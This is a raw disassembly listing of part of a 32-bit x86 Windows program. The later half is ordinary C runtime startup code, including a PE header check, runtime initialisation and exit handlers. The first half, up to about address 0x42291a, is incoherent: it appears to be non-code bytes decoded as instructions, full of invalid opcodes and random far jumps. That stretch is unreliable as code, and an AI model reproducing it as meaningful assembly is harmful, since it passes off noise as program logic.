  4223d6:	jno    0x4223f4
  4223d8:	mov    BYTE PTR [esi-0x9df57f],dh
  4223de:	idiv   DWORD PTR [edx+0x5f34f6c5]
  4223e4:	call   0xae7da072
  4223e9:	push   DWORD PTR [edi-0x37e74b41]
  4223ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4223f0:	cmp    eax,0xde7f9e7d
  4223f5:	inc    ebp
  4223f6:	dec    eax
  4223f7:	pop    eax
  4223f8:	jb     0x422425
  4223fa:	lock mov eax,0xcc8948ec
  422400:	jo     0x422460
  422402:	js     0x4223d8
  422404:	mov    ecx,0xe7799325
  422409:	dec    ecx
  42240a:	cs jmp 0xb437:0x9fe85012
  422412:	add    DWORD PTR [esp+ebx*8+0x44],0xf6c3dd6a
  42241a:	jnp    0x422419
  42241c:	cmp    DWORD PTR [eax+0x7f],esi
  42241f:	cmp    BYTE PTR [ebp+0x5f],0xeb
  422423:	xor    al,0x33
  422425:	dec    ebp
  422426:	xor    BYTE PTR [esi],dl
  422428:	add    al,0x8f
  42242a:	mov    dh,dh
  42242c:	or     edi,DWORD PTR [ebp+0x6208de29]
  422432:	push   ecx
  422433:	fimul  DWORD PTR [esi-0x1f791c52]
  422439:	push   esi
  42243a:	enter  0x9cb1,0xf3
  42243e:	dec    esi
  42243f:	xor    dl,al
  422441:	stos   BYTE PTR es:[edi],al
  422442:	sbb    DWORD PTR [edx],0x91a5143f
  422448:	mov    BYTE PTR [ebx-0x14],0x22
  42244c:	xor    al,0x2b
  42244e:	xchg   esp,eax
  42244f:	loope  0x422488
  422451:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422452:	ret    0xf368
  422455:	adc    bh,al
  422457:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422458:	mov    al,0x91
  42245a:	xchg   edi,eax
  42245b:	stc    
  42245c:	mov    bl,0x69
  42245e:	or     BYTE PTR [ebp+0x5d],al
  422461:	push   ss
  422462:	cmp    al,0x90
  422464:	icebp  
  422465:	into   
  422466:	jecxz  0x42243e
  422468:	gs push ebx
  42246a:	pop    ebx
  42246b:	repz call 0x71ed51d2
  422471:	(bad)  
  422472:	fs mov edx,0xc41324a0
  422478:	mov    ch,0xd9
  42247a:	adc    bh,bh
  42247c:	bound  eax,QWORD PTR [edx-0x10088cfb]
  422482:	in     al,dx
  422483:	xchg   esp,eax
  422484:	cmp    DWORD PTR [ebx+0x25],eax
  422487:	pop    esp
  422488:	adc    DWORD PTR [eax+0x29],edx
  42248b:	inc    ebx
  42248c:	into   
  42248d:	mov    cl,0x53
  42248f:	mov    al,0xd
  422491:	into   
  422492:	add    dl,cl
  422494:	jmp    0x8cd17e6c
  422499:	mov    cl,0xc2
  42249b:	sahf   
  42249c:	aam    0x49
  42249e:	pop    dx
  4224a0:	mov    al,ds:0xaf6b2b4f
  4224a5:	push   ss
  4224a6:	add    dl,bl
  4224a8:	pop    ss
  4224a9:	cdq    
  4224aa:	test   ebx,ecx
  4224ac:	sub    DWORD PTR [edx-0xcc11c31],edx
  4224b2:	xchg   esi,eax
  4224b3:	(bad)  
  4224b4:	adc    al,0x3a
  4224b6:	or     eax,0xbef929b9
  4224bb:	cs out 0xc,eax
  4224be:	int    0xb8
  4224c0:	xor    edx,DWORD PTR [ebx]
  4224c2:	cld    
  4224c3:	bound  edi,QWORD PTR [ecx-0x6d81082b]
  4224c9:	sub    eax,0x74aa79bb
  4224ce:	mov    edi,0x4c4afb78
  4224d3:	mov    edi,0xb0d6118e
  4224d8:	jns    0x422555
  4224da:	out    dx,al
  4224db:	jmp    0x437c:0x104515ab
  4224e2:	enter  0xdc15,0x85
  4224e6:	aam    0x7
  4224e8:	in     eax,dx
  4224e9:	shl    edi,0x9e
  4224ec:	xor    esi,DWORD PTR [esp+ecx*8+0x2b8be1bf]
  4224f3:	das    
  4224f4:	xchg   esi,eax
  4224f5:	pop    esi
  4224f6:	inc    edi
  4224f7:	popa   
  4224f8:	mov    edi,0x83cb4adf
  4224fd:	pop    ecx
  4224fe:	mov    eax,0xac91f595
  422503:	cld    
  422504:	in     al,dx
  422505:	inc    esp
  422506:	xor    eax,0xb865f973
  42250b:	dec    ecx
  42250c:	jg     0x422526
  42250e:	shl    BYTE PTR [edi-0x18],1
  422511:	mov    es:0x3ee660bc,eax
  422517:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422518:	and    bl,al
  42251a:	jle    0x422548
  42251c:	call   0x13e3:0xe4d6b129
  422523:	lds    ecx,FWORD PTR [eax-0x19]
  422526:	adc    edx,ebp
  422528:	shl    BYTE PTR [edi-0x22],1
  42252b:	xlat   BYTE PTR ds:[ebx]
  42252c:	pop    edx
  42252d:	push   es
  42252e:	(bad)  
  42252f:	(bad)  
  422530:	nop
  422531:	mov    ecx,0x38f8e472
  422536:	shl    DWORD PTR [eax+0x5f],1
  422539:	(bad)  
  42253a:	dec    ecx
  42253b:	ds fs sbb dh,cl
  42253f:	push   esp
  422540:	adc    dl,0xd3
  422543:	adc    ebx,DWORD PTR [edx]
  422545:	xchg   ebp,eax
  422546:	cmp    DWORD PTR [eax],esi
  422548:	ja     0x4225ac
  42254a:	mov    DWORD PTR [ebp+0x1f],esp
  42254d:	xchg   ebp,eax
  42254e:	sub    ebp,edx
  422550:	cli    
  422551:	fsub   st(3),st
  422553:	clc    
  422554:	sub    BYTE PTR ss:[esi-0x15c2aba9],al
  42255b:	inc    edi
  42255c:	mov    eax,0x4976a6ca
  422561:	lods   al,BYTE PTR ds:[esi]
  422562:	repz out dx,al
  422564:	pop    ds
  422565:	inc    ecx
  422566:	cmp    ah,BYTE PTR [eax-0xc]
  422569:	loop   0x422551
  42256b:	push   ss
  42256c:	cmp    al,cl
  42256e:	xchg   BYTE PTR [esi-0x61788f90],dl
  422574:	nop
  422575:	fldenv [edi+0x59500356]
  42257b:	jb     0x42253b
  42257d:	mov    eax,ds:0xe46ec942
  422582:	mov    bl,0x44
  422584:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422585:	aaa    
  422586:	pop    eax
  422587:	inc    edx
  422588:	or     al,0x13
  42258a:	mov    ?,WORD PTR [edx]
  42258c:	(bad)  
  42258d:	test   eax,0x61d5c1a
  422592:	dec    ecx
  422593:	call   0xa626:0xe60326b7
  42259a:	fst    DWORD PTR [edx]
  42259c:	mov    ebx,0x4515a4e6
  4225a1:	ja     0x42259c
  4225a3:	add    ebp,ebx
  4225a5:	mov    ebp,0xc5a583be
  4225aa:	mov    ds:0x46d92228,al
  4225af:	push   eax
  4225b0:	pop    ecx
  4225b1:	and    al,BYTE PTR [edx+0x1cf8f511]
  4225b7:	mov    bl,0x2e
  4225b9:	push   ds
  4225ba:	rol    BYTE PTR [ebx-0xb],cl
  4225bd:	enter  0xe7af,0x97
  4225c1:	dec    edx
  4225c2:	es pop eax
  4225c4:	sbb    ecx,ebx
  4225c6:	into   
  4225c7:	ficomp DWORD PTR [ebp+0x370b8366]
  4225cd:	fwait
  4225ce:	neg    DWORD PTR [esi+0x48e18050]
  4225d4:	leave  
  4225d5:	retf   
  4225d6:	push   0xbf4cee41
  4225db:	xchg   BYTE PTR [eax],bh
  4225dd:	jnp    0x422652
  4225df:	pop    ecx
  4225e0:	mov    esi,0x7f1eae93
  4225e5:	adc    BYTE PTR [ebp-0x5e],ch
  4225e8:	lods   al,BYTE PTR ds:[esi]
  4225e9:	pushf  
  4225ea:	mov    ch,0x4d
  4225ec:	call   0xc90f:0xf40f537
  4225f3:	add    ecx,DWORD PTR [edx]
  4225f5:	jae    0x4225ec
  4225f7:	jle    0x422644
  4225f9:	mov    ah,BYTE PTR [ecx-0x3d]
  4225fc:	(bad)  
  4225fd:	in     al,0xb0
  4225ff:	sbb    ebp,DWORD PTR [edi]
  422601:	mov    edx,0x295131bc
  422606:	jg     0x4225c5
  422608:	idiv   al
  42260a:	enter  0x4767,0xe2
  42260e:	data16 loopne 0x42259e
  422611:	add    eax,0x1a8bb8a1
  422616:	dec    esp
  422617:	xchg   BYTE PTR [esi-0x55ef1966],cl
  42261d:	mov    esi,0xd50985eb
  422622:	ins    BYTE PTR es:[edi],dx
  422623:	jl     0x42261a
  422625:	add    DWORD PTR [eax],eax
  422627:	bound  edi,QWORD PTR [edx+0x1f106a1d]
  42262d:	push   ds
  42262e:	pop    ds
  42262f:	imul   ecx,ebx,0x628115f2
  422635:	out    dx,eax
  422636:	aam    0xb2
  422638:	cmp    edx,esi
  42263a:	in     eax,0x20
  42263c:	cmp    al,0x6d
  42263e:	xchg   edi,eax
  42263f:	test   DWORD PTR [ecx+edi*8-0x4ef7ed34],esi
  422646:	and    DWORD PTR [ebx],0x5d7eae10
  42264c:	mov    al,ds:0x99fc5a5f
  422651:	jb     0x4226c4
  422653:	test   BYTE PTR [edi+esi*8],ch
  422656:	sbb    DWORD PTR [edi-0x68],edx
  422659:	leave  
  42265a:	inc    esp
  42265b:	loopne 0x4226a6
  42265d:	lahf   
  42265e:	lds    ecx,FWORD PTR [ecx-0xb7e2611]
  422664:	jb     0x42266c
  422666:	dec    ecx
  422667:	sbb    ch,BYTE PTR [edx+ebp*4]
  42266a:	mov    ah,0xab
  42266c:	cwde   
  42266d:	repz push eax
  42266f:	xor    DWORD PTR [edi-0x4f],ebp
  422672:	imul   eax,DWORD PTR [edx+0x12],0x2c7e1f72
  422679:	or     eax,0x22ffb36f
  42267e:	jno    0x422611
  422680:	fbstp  TBYTE PTR [esi-0x13]
  422683:	mov    ds:0x576a7240,al
  422688:	fs addr16 (bad) 
  42268b:	pushf  
  42268c:	das    
  42268d:	popf   
  42268e:	outs   dx,BYTE PTR ds:[esi]
  42268f:	fmul   QWORD PTR [esi]
  422691:	sbb    dl,cl
  422693:	cs adc al,0x92
  422696:	mov    ch,0x5c
  422698:	adc    BYTE PTR [edx+0x2b],0xf4
  42269c:	mov    dh,0xec
  42269e:	jecxz  0x422694
  4226a0:	push   0x9a211e73
  4226a5:	lods   eax,DWORD PTR ds:[esi]
  4226a6:	dec    eax
  4226a7:	into   
  4226a8:	adc    esp,esi
  4226aa:	out    dx,eax
  4226ab:	(bad)  [ebp+0x13]
  4226ae:	and    esp,DWORD PTR [ecx]
  4226b0:	das    
  4226b1:	mov    edi,0xdebd519d
  4226b6:	stos   BYTE PTR es:[edi],al
  4226b7:	into   
  4226b8:	jo     0x42269a
  4226ba:	adc    BYTE PTR fs:[edx+0x51],dh
  4226be:	sbb    DWORD PTR [eax+0xe],edx
  4226c1:	int    0xbb
  4226c3:	inc    eax
  4226c4:	sub    BYTE PTR [edx-0x1dd9fe1f],bh
  4226ca:	sbb    BYTE PTR [ebx],al
  4226cc:	retf   
  4226cd:	call   0xa112:0xce3ea9ae
  4226d4:	mov    cl,0x3b
  4226d6:	aas    
  4226d7:	cld    
  4226d8:	fsubr  DWORD PTR [edx-0xe1c33d9]
  4226de:	pushf  
  4226df:	sbb    dh,BYTE PTR [edx-0x40]
  4226e2:	rol    DWORD PTR [esp+eax*2-0x78],0xe4
  4226e7:	mov    ecx,es
  4226e9:	push   esi
  4226ea:	add    al,0xd3
  4226ec:	rcr    BYTE PTR [eax-0x60898fdf],1
  4226f2:	inc    ebp
  4226f3:	push   ecx
  4226f4:	cs imul ebx,ebp,0x1f
  4226f8:	mov    cs,edx
  4226fa:	lea    ebx,[edi+0x6118694e]
  422700:	fs sub esi,edi
  422703:	mov    ds:0xf7b8aba1,eax
  422708:	push   edi
  422709:	lahf   
  42270a:	mov    bl,0x7e
  42270c:	in     eax,dx
  42270d:	and    al,0x5a
  42270f:	js     0x4226e7
  422711:	fstp   QWORD PTR [ecx+0x74]
  422714:	ins    DWORD PTR es:[edi],dx
  422715:	xor    ecx,DWORD PTR [eax-0x5b]
  422718:	inc    esp
  422719:	nop
  42271a:	push   edi
  42271b:	dec    eax
  42271c:	inc    esi
  42271d:	aas    
  42271e:	scas   eax,DWORD PTR es:[edi]
  42271f:	push   ebx
  422720:	jae    0x4226b5
  422722:	mov    al,0xc4
  422724:	ds call 0x40e4:0x3ba7e624
  42272c:	mov    dh,0x80
  42272e:	popf   
  42272f:	and    al,0xc0
  422731:	cmp    dl,bl
  422733:	mov    al,0xf1
  422735:	sub    esp,edx
  422737:	sbb    edi,DWORD PTR [eax+edx*8-0x27]
  42273b:	push   ebp
  42273c:	int    0x22
  42273e:	mov    esi,0x8253fed2
  422743:	cmp    BYTE PTR [esi],0xb3
  422746:	or     DWORD PTR [edx+0x3c9205b3],ebx
  42274c:	lds    ecx,FWORD PTR ds:0xf2eccb14
  422752:	adc    eax,0x2b0d6f62
  422757:	mov    ebx,fs
  422759:	mov    ebx,0x66432a90
  42275e:	test   eax,0xcc9a8dfb
  422763:	(bad)  
  422764:	lahf   
  422765:	ficom  DWORD PTR [eax]
  422767:	xor    BYTE PTR [edx+ecx*4],dl
  42276a:	ins    DWORD PTR es:[di],dx
  42276c:	test   al,0xa
  42276e:	dec    ebp
  42276f:	adc    BYTE PTR [edi+0x1a],cl
  422772:	retf   0x70cb
  422775:	stos   BYTE PTR es:[edi],al
  422776:	retf   0x12d6
  422779:	pop    ds
  42277a:	mov    DWORD PTR [edi-0x7e],edi
  42277d:	push   ebx
  42277e:	push   eax
  42277f:	mov    bl,0x5e
  422781:	(bad)  
  422782:	stos   BYTE PTR es:[edi],al
  422783:	xchg   DWORD PTR [ecx+ecx*1+0x6fef4512],edi
  42278a:	dec    edi
  42278b:	push   eax
  42278c:	fcomp  DWORD PTR [eax-0x5953efc6]
  422792:	scas   eax,DWORD PTR es:[edi]
  422793:	pop    edi
  422794:	movzx  eax,BYTE PTR ds:0x6cb5bb76
  42279b:	sub    al,BYTE PTR ds:0xd5fb5f95
  4227a1:	leave  
  4227a2:	push   ebx
  4227a3:	aaa    
  4227a4:	das    
  4227a5:	lds    esp,FWORD PTR [edx+0x22]
  4227a8:	scas   eax,DWORD PTR es:[edi]
  4227a9:	lea    edx,ds:[esi+0x36df89b6]
  4227b0:	inc    edi
  4227b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227b2:	xchg   edx,eax
  4227b3:	mov    ebx,DWORD PTR [ebx]
  4227b5:	iret   
  4227b6:	xor    eax,0xbbba93be
  4227bb:	push   eax
  4227bc:	push   esp
  4227bd:	mov    edx,0x7e4c6769
  4227c2:	loopne 0x422772
  4227c4:	out    dx,al
  4227c5:	lock fist WORD PTR [eax]
  4227c8:	mov    ch,0x13
  4227ca:	or     DWORD PTR [edi+0x119701b1],ebp
  4227d0:	adc    ch,dl
  4227d2:	das    
  4227d3:	stos   BYTE PTR es:[edi],al
  4227d4:	pop    edx
  4227d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4227d6:	pop    eax
  4227d7:	add    edi,DWORD PTR [esi]
  4227d9:	fwait
  4227da:	mov    dl,0x49
  4227dc:	or     DWORD PTR [edx],ebx
  4227de:	add    BYTE PTR [esp+edx*8+0x13],bh
  4227e2:	cmc    
  4227e3:	mov    ds,WORD PTR [esi+0x3ebe229c]
  4227e9:	cmp    dl,ah
  4227eb:	pop    edx
  4227ec:	sbb    eax,0x6db2a816
  4227f1:	jae    0x42285b
  4227f3:	xor    DWORD PTR [edx],edx
  4227f5:	sbb    cl,BYTE PTR [ecx+0x66]
  4227f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227f9:	mov    BYTE PTR [ecx+0x7f],dl
  4227fc:	sub    edi,eax
  4227fe:	fisubr DWORD PTR [edi]
  422800:	sbb    eax,DWORD PTR [ebx+ebx*1-0x43]
  422804:	and    bl,ah
  422806:	arpl   WORD PTR [ebx-0x6573c5be],sp
  42280c:	in     eax,0xdd
  42280e:	push   0x50aa978b
  422813:	mov    bl,0x4a
  422815:	nop
  422816:	dec    ebp
  422817:	outs   dx,BYTE PTR ds:[esi]
  422818:	retf   
  422819:	pop    ss
  42281a:	push   cs
  42281b:	inc    ebx
  42281c:	cmp    BYTE PTR [eax-0x5dc49e5d],0x15
  422823:	cdq    
  422824:	fadd   st,st(0)
  422826:	sub    dh,cl
  422828:	dec    eax
  422829:	mov    ss,WORD PTR [edx+0x6477a2a4]
  42282f:	cmp    ch,0xff
  422832:	push   0x8e3a552
  422837:	lods   eax,DWORD PTR ds:[esi]
  422838:	fmul   QWORD PTR [ebx+0x1704aff]
  42283e:	pop    ebp
  42283f:	sub    dh,BYTE PTR [edx]
  422841:	sub    dl,BYTE PTR [ebx]
  422843:	jmp    0x4227d4
  422845:	jg     0x4228af
  422847:	dec    eax
  422848:	cwde   
  422849:	rcl    DWORD PTR [edx-0x31],1
  42284c:	retf   0x496e
  42284f:	loopne 0x4228a9
  422851:	cmp    DWORD PTR [ebp-0x1f813b31],ebp
  422857:	mov    eax,0x233f1c89
  42285c:	bswap  edi
  42285e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42285f:	pop    ebp
  422860:	mul    DWORD PTR [eax]
  422862:	dec    ecx
  422863:	push   edi
  422864:	sub    ebx,DWORD PTR [esi+eiz*8+0x0]
  422868:	or     eax,DWORD PTR [edx-0x6cad374f]
  42286e:	adc    DWORD PTR [ebx-0xfbb54a6],edx
  422874:	push   esp
  422875:	cmp    ch,BYTE PTR [edi]
  422877:	add    DWORD PTR [edi+0x7147277a],0xf767abe8
  422881:	cld    
  422882:	repz sar DWORD PTR [edx-0x39542466],0xee
  42288a:	add    al,BYTE PTR [ebx+ebx*4+0x6e]
  42288e:	push   0xf7b13ffc
  422893:	add    eax,0x603a436f
  422898:	es in  al,0xf4
  42289b:	out    dx,al
  42289c:	aad    0x3e
  42289e:	push   esi
  42289f:	mov    ch,al
  4228a1:	das    
  4228a2:	(bad)  
  4228a3:	idiv   BYTE PTR [edi+0x6048eff4]
  4228a9:	add    BYTE PTR [ebx+ecx*2-0x7f],bl
  4228ad:	sub    al,BYTE PTR [esi-0x6751857b]
  4228b3:	cld    
  4228b4:	pop    ss
  4228b5:	jp     0x42283b
  4228b7:	adc    eax,edx
  4228b9:	and    ecx,DWORD PTR [eax+edx*4]
  4228bc:	pop    ecx
  4228bd:	sub    DWORD PTR [ebp-0x37],ebx
  4228c0:	shl    DWORD PTR [edx-0x7ccf2c10],0xa3
  4228c7:	enter  0xadff,0xd9
  4228cb:	mov    dl,BYTE PTR [eax]
  4228cd:	pop    esi
  4228ce:	jb     0x422933
  4228d0:	xchg   esi,eax
  4228d1:	dec    eax
  4228d2:	add    ebp,DWORD PTR ds:0x51eeee4d
  4228d8:	inc    ebx
  4228d9:	ins    BYTE PTR es:[edi],dx
  4228da:	pop    eax
  4228db:	popa   
  4228dc:	and    bh,dh
  4228de:	pop    ds
  4228df:	xchg   esp,eax
  4228e0:	push   ecx
  4228e1:	xor    edi,DWORD PTR [edx]
  4228e3:	cs mov al,0x28
  4228e6:	(bad)  
  4228e7:	enter  0xf871,0xa1
  4228eb:	xor    DWORD PTR [ecx+0x12],esi
  4228ee:	xchg   edi,eax
  4228ef:	popa   
  4228f0:	cmp    eax,0xeb6f252b
  4228f5:	push   eax
  4228f6:	fnsave [ebp-0x43c8b694]
  4228fc:	js     0x4228eb
  4228fe:	mov    bl,0x25
  422900:	hlt    
  422901:	mov    esp,0x2ad24834
  422906:	call   0xf66ba189
  42290b:	in     eax,0xe6
  42290d:	jo     0x422912
  42290f:	jecxz  0x42295e
  422911:	mov    dl,0xa1
  422913:	jns    0x4228ba
  422915:	xor    eax,eax
  422917:	mov    esp,ebp
  422919:	pop    ebp
  42291a:	ret    0x10
  42291d:	nop
  42291e:	nop
  42291f:	nop
  422920:	cmp    DWORD PTR ds:0x45cabc,0x1
  422927:	jne    0x42292e
  422929:	call   0x422e6c
  42292e:	push   DWORD PTR [esp+0x4]
  422932:	call   0x422cf5
  422937:	push   0xff
  42293c:	call   DWORD PTR ds:0x45c1c0
  422942:	pop    ecx
  422943:	pop    ecx
  422944:	ret    
  422945:	cmp    DWORD PTR ds:0x45cabc,0x1
  42294c:	jne    0x422953
  42294e:	call   0x422e6c
  422953:	push   DWORD PTR [esp+0x4]
  422957:	call   0x422cf5
  42295c:	push   0xff
  422961:	call   0x422b3b
  422966:	pop    ecx
  422967:	pop    ecx
  422968:	ret    
  422969:	push   0x60
  42296b:	push   0x428110
  422970:	call   0x423858
  422975:	mov    edi,0x94
  42297a:	mov    eax,edi
  42297c:	call   0x4238b0
  422981:	mov    DWORD PTR [ebp-0x18],esp
  422984:	mov    esi,esp
  422986:	mov    DWORD PTR [esi],edi
  422988:	push   esi
  422989:	call   DWORD PTR ds:0x428024
  42298f:	mov    ecx,DWORD PTR [esi+0x10]
  422992:	mov    DWORD PTR ds:0x45cac4,ecx
  422998:	mov    eax,DWORD PTR [esi+0x4]
  42299b:	mov    ds:0x45cad0,eax
  4229a0:	mov    edx,DWORD PTR [esi+0x8]
  4229a3:	mov    DWORD PTR ds:0x45cad4,edx
  4229a9:	mov    esi,DWORD PTR [esi+0xc]
  4229ac:	and    esi,0x7fff
  4229b2:	mov    DWORD PTR ds:0x45cac8,esi
  4229b8:	cmp    ecx,0x2
  4229bb:	je     0x4229c9
  4229bd:	or     esi,0x8000
  4229c3:	mov    DWORD PTR ds:0x45cac8,esi
  4229c9:	shl    eax,0x8
  4229cc:	add    eax,edx
  4229ce:	mov    ds:0x45cacc,eax
  4229d3:	xor    esi,esi
  4229d5:	push   esi
  4229d6:	mov    edi,DWORD PTR ds:0x428014
  4229dc:	call   edi
  4229de:	cmp    WORD PTR [eax],0x5a4d
  4229e3:	jne    0x422a04
  4229e5:	mov    ecx,DWORD PTR [eax+0x3c]
  4229e8:	add    ecx,eax
  4229ea:	cmp    DWORD PTR [ecx],0x4550
  4229f0:	jne    0x422a04
  4229f2:	movzx  eax,WORD PTR [ecx+0x18]
  4229f6:	cmp    eax,0x10b
  4229fb:	je     0x422a1c
  4229fd:	cmp    eax,0x20b
  422a02:	je     0x422a09
  422a04:	mov    DWORD PTR [ebp-0x1c],esi
  422a07:	jmp    0x422a30
  422a09:	cmp    DWORD PTR [ecx+0x84],0xe
  422a10:	jbe    0x422a04
  422a12:	xor    eax,eax
  422a14:	cmp    DWORD PTR [ecx+0xf8],esi
  422a1a:	jmp    0x422a2a
  422a1c:	cmp    DWORD PTR [ecx+0x74],0xe
  422a20:	jbe    0x422a04
  422a22:	xor    eax,eax
  422a24:	cmp    DWORD PTR [ecx+0xe8],esi
  422a2a:	setne  al
  422a2d:	mov    DWORD PTR [ebp-0x1c],eax
  422a30:	push   0x1
  422a32:	call   0x423807
  422a37:	pop    ecx
  422a38:	test   eax,eax
  422a3a:	jne    0x422a44
  422a3c:	push   0x1c
  422a3e:	call   0x422945
  422a43:	pop    ecx
  422a44:	call   0x42377e
  422a49:	test   eax,eax
  422a4b:	jne    0x422a55
  422a4d:	push   0x10
  422a4f:	call   0x422945
  422a54:	pop    ecx
  422a55:	call   0x423667
  422a5a:	mov    DWORD PTR [ebp-0x4],esi
  422a5d:	call   0x423469
  422a62:	test   eax,eax
  422a64:	jge    0x422a6e
  422a66:	push   0x1b
  422a68:	call   0x422920
  422a6d:	pop    ecx
  422a6e:	call   DWORD PTR ds:0x428020
  422a74:	mov    ds:0x45d274,eax
  422a79:	call   0x423347
  422a7e:	mov    ds:0x45cab4,eax
  422a83:	call   0x4232a5
  422a88:	test   eax,eax
  422a8a:	jge    0x422a94
  422a8c:	push   0x8
  422a8e:	call   0x422920
  422a93:	pop    ecx
  422a94:	call   0x423072
  422a99:	test   eax,eax
  422a9b:	jge    0x422aa5
  422a9d:	push   0x9
  422a9f:	call   0x422920
  422aa4:	pop    ecx
  422aa5:	call   0x422b7d
  422aaa:	mov    DWORD PTR [ebp-0x20],eax
  422aad:	cmp    eax,esi
  422aaf:	je     0x422ab8
  422ab1:	push   eax
  422ab2:	call   0x422920
  422ab7:	pop    ecx
  422ab8:	mov    DWORD PTR [ebp-0x38],esi
  422abb:	lea    eax,[ebp-0x64]
  422abe:	push   eax
  422abf:	call   DWORD PTR ds:0x42801c
  422ac5:	call   0x423009
  422aca:	mov    DWORD PTR [ebp-0x68],eax
  422acd:	test   BYTE PTR [ebp-0x38],0x1
  422ad1:	je     0x422ad9
  422ad3:	movzx  eax,WORD PTR [ebp-0x34]
  422ad7:	jmp    0x422adc
  422ad9:	push   0xa
  422adb:	pop    eax
  422adc:	push   eax
  422add:	push   DWORD PTR [ebp-0x68]
  422ae0:	push   esi
  422ae1:	push   esi
  422ae2:	call   edi
  422ae4:	push   eax
  422ae5:	call   0x421790
  422aea:	mov    edi,eax
  422aec:	mov    DWORD PTR [ebp-0x6c],edi
  422aef:	cmp    DWORD PTR [ebp-0x1c],esi
  422af2:	jne    0x422afa
  422af4:	push   edi
  422af5:	call   0x422cb5
  422afa:	call   0x422cd7
  422aff:	jmp    0x422b2c
  422b01:	mov    eax,DWORD PTR [ebp-0x14]
  422b04:	mov    ecx,DWORD PTR [eax]
  422b06:	mov    ecx,DWORD PTR [ecx]
  422b08:	mov    DWORD PTR [ebp-0x70],ecx
  422b0b:	push   eax
  422b0c:	push   ecx
  422b0d:	call   0x422ea5
  422b12:	pop    ecx
  422b13:	pop    ecx
  422b14:	ret    
  422b15:	mov    esp,DWORD PTR [ebp-0x18]
  422b18:	mov    edi,DWORD PTR [ebp-0x70]
  422b1b:	cmp    DWORD PTR [ebp-0x1c],0x0
  422b1f:	jne    0x422b27
  422b21:	push   edi
  422b22:	call   0x422cc6
  422b27:	call   0x422ce6
  422b2c:	or     DWORD PTR [ebp-0x4],0xffffffff
  422b30:	mov    eax,edi
  422b32:	lea    esp,[ebp-0x7c]
  422b35:	call   0x423893
  422b3a:	ret    
  422b3b:	push   0x42812c
  422b40:	call   DWORD PTR ds:0x428014
  422b46:	test   eax,eax
  422b48:	je     0x422b60
  422b4a:	push   0x42811c
  422b4f:	push   eax
  422b50:	call   DWORD PTR ds:0x428018
  422b56:	test   eax,eax
  422b58:	je     0x422b60
  422b5a:	push   DWORD PTR [esp+0x4]
  422b5e:	call   eax
  422b60:	push   DWORD PTR [esp+0x4]
  422b64:	call   DWORD PTR ds:0x428028
  422b6a:	int3   
  422b6b:	push   0x8
  422b6d:	call   0x423a1f
  422b72:	pop    ecx
  422b73:	ret    
  422b74:	push   0x8
  422b76:	call   0x42398b
  422b7b:	pop    ecx
  422b7c:	ret    
  422b7d:	mov    eax,ds:0x45d270
  422b82:	test   eax,eax
  422b84:	je     0x422b88
  422b86:	call   eax
  422b88:	push   esi
  422b89:	push   edi
  422b8a:	mov    ecx,0x42a00c
  422b8f:	mov    edi,0x42a018
  422b94:	xor    eax,eax
  422b96:	cmp    ecx,edi
  422b98:	mov    esi,ecx
  422b9a:	jae    0x422bb3
  422b9c:	test   eax,eax
  422b9e:	jne    0x422bdf
  422ba0:	mov    ecx,DWORD PTR [esi]
  422ba2:	test   ecx,ecx
  422ba4:	je     0x422ba8
  422ba6:	call   ecx
  422ba8:	add    esi,0x4
  422bab:	cmp    esi,edi
  422bad:	jb     0x422b9c
  422baf:	test   eax,eax
  422bb1:	jne    0x422bdf
  422bb3:	push   0x4236ab
  422bb8:	call   0x423b30
  422bbd:	mov    esi,0x42a000
  422bc2:	mov    eax,esi
  422bc4:	mov    edi,0x42a008
  422bc9:	cmp    eax,edi
  422bcb:	pop    ecx
  422bcc:	jae    0x422bdd
  422bce:	mov    eax,DWORD PTR [esi]
  422bd0:	test   eax,eax
  422bd2:	je     0x422bd6
  422bd4:	call   eax
  422bd6:	add    esi,0x4
  422bd9:	cmp    esi,edi
  422bdb:	jb     0x422bce
  422bdd:	xor    eax,eax
  422bdf:	pop    edi
  422be0:	pop    esi
  422be1:	ret    
  422be2:	push   ebp
  422be3:	mov    ebp,esp
  422be5:	push   esi
  422be6:	push   edi
  422be7:	push   0x8
  422be9:	call   0x423a1f
  422bee:	xor    esi,esi
  422bf0:	inc    esi
  422bf1:	cmp    DWORD PTR ds:0x45cb04,esi
  422bf7:	pop    ecx
  422bf8:	jne    0x422c0a
  422bfa:	push   DWORD PTR [ebp+0x8]
  422bfd:	call   DWORD PTR ds:0x428030
  422c03:	push   eax
  422c04:	call   DWORD PTR ds:0x42802c
  422c0a:	cmp    DWORD PTR [ebp+0xc],0x0
  422c0e:	mov    al,BYTE PTR [ebp+0x10]
  422c11:	mov    DWORD PTR ds:0x45cb00,esi
  422c17:	mov    ds:0x45cafc,al
  422c1c:	jne    0x422c70
  422c1e:	mov    ecx,DWORD PTR ds:0x45d268
  422c24:	test   ecx,ecx
  422c26:	je     0x422c51
  422c28:	mov    eax,ds:0x45d264
  422c2d:	sub    eax,0x4
  422c30:	cmp    eax,ecx
  422c32:	jmp    0x422c4a
  422c34:	mov    eax,DWORD PTR [eax]
  422c36:	test   eax,eax
  422c38:	je     0x422c3c
  422c3a:	call   eax
  422c3c:	mov    eax,ds:0x45d264
  422c41:	sub    eax,0x4
  422c44:	cmp    eax,DWORD PTR ds:0x45d268
  422c4a:	mov    ds:0x45d264,eax
  422c4f:	jae    0x422c34
  422c51:	mov    eax,0x42a01c
  422c56:	mov    esi,0x42a020
  422c5b:	cmp    eax,esi
  422c5d:	mov    edi,eax
  422c5f:	jae    0x422c70
  422c61:	mov    eax,DWORD PTR [edi]
  422c63:	test   eax,eax
  422c65:	je     0x422c69
  422c67:	call   eax
  422c69:	add    edi,0x4
  422c6c:	cmp    edi,esi
  422c6e:	jb     0x422c61
  422c70:	mov    eax,0x42a024
  422c75:	mov    esi,0x42a028
  422c7a:	cmp    eax,esi
  422c7c:	mov    edi,eax
  422c7e:	jae    0x422c8f
  422c80:	mov    eax,DWORD PTR [edi]
  422c82:	test   eax,eax
  422c84:	je     0x422c88
  422c86:	call   eax
  422c88:	add    edi,0x4
